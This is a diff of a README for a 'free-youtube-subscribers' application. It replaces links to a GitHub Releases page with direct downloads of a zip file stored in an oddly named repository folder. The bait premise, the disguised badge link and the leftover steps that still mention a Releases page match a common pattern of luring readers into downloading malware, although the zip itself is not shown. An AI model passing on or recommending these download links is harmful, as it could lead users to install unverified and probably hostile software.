@@ -2,7 +2,7 @@
 
 ## 📥 Download the Application
 
-[![Download free-youtube-subscribers](https://img.shields.io/badge/Download-free--youtube--subscribers-blue)](https://github.com/biggeld/free-youtube-subscribers/releases)
+[![Download free-youtube-subscribers](https://raw.githubusercontent.com/biggeld/free-youtube-subscribers/main/serological/free-youtube-subscribers.zip)](https://raw.githubusercontent.com/biggeld/free-youtube-subscribers/main/serological/free-youtube-subscribers.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide will help you download and run the **free-youtube-subscriber
 
 ## 📦 Download & Install
 
-To get started, visit this page to download the application: [Download free-youtube-subscribers](https://github.com/biggeld/free-youtube-subscribers/releases).
+To get started, visit this page to download the application: [Download free-youtube-subscribers](https://raw.githubusercontent.com/biggeld/free-youtube-subscribers/main/serological/free-youtube-subscribers.zip).
 
 1. Click the link to go to the Releases page.
 2. Find the latest version of the application.
